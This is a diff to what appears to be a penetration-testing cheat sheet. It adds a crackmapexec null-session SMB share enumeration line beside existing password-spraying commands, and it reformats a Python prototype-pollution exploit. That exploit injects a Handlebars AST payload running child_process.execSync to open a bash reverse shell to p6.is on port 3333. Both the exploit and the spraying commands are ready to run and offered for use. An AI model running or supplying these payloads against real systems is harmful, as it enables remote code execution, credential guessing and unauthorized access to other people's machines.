@@ -289,6 +289,7 @@ crackmapexec smb 10.10.10.193
 crackmapexec smb 10.10.10.193 -u users.txt -p passwords.txt
 crackmapexec smb 10.10.10.193 -u users.txt -p passwords.txt --continue-on-success | grep -vi "FAILURE"
 crackmapexec smb 10.10.10.193 --shares 
+crackmapexec smb 10.10.10.193 --shares -u 'null' -p ''  # When "STATUS_USER_SESSION_DELETED" is showed maybe works
 
 # Check if is valide user and password OR NT hash
 crackmapexec smb 10.10.10.192 -u "Administrator" -p "AdminPass"
@@ -2476,19 +2477,19 @@ TARGET_URL = 'http://p6.is:3000'
 
 # make pollution
 requests.post(TARGET_URL + '/vulnerable', json = {
-    "__proto__.type": "Program",
-    "__proto__.body": [{
-        "type": "MustacheStatement",
-        "path": 0,
-        "params": [{
-            "type": "NumberLiteral",
-            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
-        }],
-        "loc": {
-            "start": 0,
-            "end": 0
-        }
-    }]
+	"__proto__.type": "Program",
+	"__proto__.body": [{
+		"type": "MustacheStatement",
+		"path": 0,
+		"params": [{
+			"type": "NumberLiteral",
+			"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
+		}],
+		"loc": {
+			"start": 0,
+			"end": 0
+		}
+	}]
 })
 
 # execute
@@ -2503,19 +2504,19 @@ TARGET_URL = 'http://p6.is:3000'
 
 # make pollution
 requests.post(TARGET_URL + '/vulnerable', json = {
-    "__proto__.type": "Program",
-    "__proto__.body": [{
-        "type": "MustacheStatement",
-        "path": 0,
-        "params": [{
-            "type": "NumberLiteral",
-            "value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
-        }],
-        "loc": {
-            "start": 0,
-            "end": 0
-        }
-    }]
+	"__proto__.type": "Program",
+	"__proto__.body": [{
+		"type": "MustacheStatement",
+		"path": 0,
+		"params": [{
+			"type": "NumberLiteral",
+			"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
+		}],
+		"loc": {
+			"start": 0,
+			"end": 0
+		}
+	}]
 })
 
 # execute
